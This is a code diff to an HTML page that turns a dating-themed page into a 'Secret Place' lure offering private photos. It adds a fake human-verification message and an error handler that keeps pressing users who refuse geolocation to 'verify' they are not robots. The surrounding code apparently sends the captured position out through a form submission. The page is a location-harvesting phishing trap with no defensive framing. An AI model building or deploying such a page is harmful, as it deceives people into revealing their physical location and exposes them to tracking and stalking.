@@ -10,11 +10,12 @@
   </head>
 <body>
   <header>
-    Welcome To MeChat
+    Welcome To Secret Place
   </header>
   <marquee>
-    💘 Find Your Love Ones Here 💘
+    💘 Share Your Secret photos Without any Fear 💘
   </marquee>
+  <p id="warning">This Photo is a <strong>Private</strong>. Please Open The Location. So We can verify that you are a Human</p>
   <div id="image">
     <img id="Gimage" src="https://papers.co/wallpaper/papers.co-hp99-girl-small-cute-asian-kpop-34-iphone6-plus-wallpaper.jpg">
 
@@ -30,14 +31,14 @@
   
 </div>
 <footer>
-  FIND YOUR LOVE
+  WE LOVE OUR CUSTOMERS 
 </footer>
 <script>
 const x = document.getElementById("demo");
 
 function getLocation() {
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
+    navigator.geolocation.getCurrentPosition(showPosition,showError);
   } else { 
     alert("You Need to allow To See the Profile");
   }
@@ -66,7 +67,22 @@ function showPosition(position) {
         console.log("Oops! There was a problem submitting your form");
       });
 }
-
+function showError(error) {
+  switch(error.code) {
+    case error.PERMISSION_DENIED:
+      alert("Open Location and allow to verify us that You are not a Robot")
+      break;
+    case error.POSITION_UNAVAILABLE:
+      alert("information is unavailable.")
+      break;
+    case error.TIMEOUT:
+      alert("The request to get user timed out.")
+      break;
+    case error.UNKNOWN_ERROR:
+      alert("An unknown error occurred.")
+      break;
+  }
+}
 
 </script>
 
